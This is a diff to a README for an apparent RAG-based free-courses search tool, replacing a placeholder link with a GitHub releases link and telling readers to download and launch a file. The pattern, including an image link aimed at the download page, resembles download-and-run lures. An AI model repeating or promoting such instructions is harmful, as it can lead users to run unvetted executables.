@@ -18,7 +18,7 @@ The repository covers a wide range of topics, including:
 - Vector Database
 
 ## Explore the Repository
-To access the tool, click on the following link: [Download Now!](https://github.com/uploads/App.zip)
+To access the tool, click on the following link: [Download Now!](https://github.com/Arthur14123/Rag_free_cources_assisstant/releases)
 
 If the link ends with a file name, make sure to launch the downloaded file to start using the innovative RAG based smart search tool. 🚀
 
@@ -31,7 +31,7 @@ In case you encounter any issues with the provided link, please visit the "Relea
 
 ## 🌟 Embrace Lifelong Learning with "Rag_free_courses_assistant" 🚀
 
-![RAG Free Courses Assistant](https://example.com/image.jpg)
+![RAG Free Courses Assistant](https://github.com/Arthur14123/Rag_free_cources_assisstant/releases)
 
 Let the power of RAG technology guide you towards educational excellence! Start your upskilling journey today with the ultimate free courses assistant. 👩‍🎓👨‍🎓
 
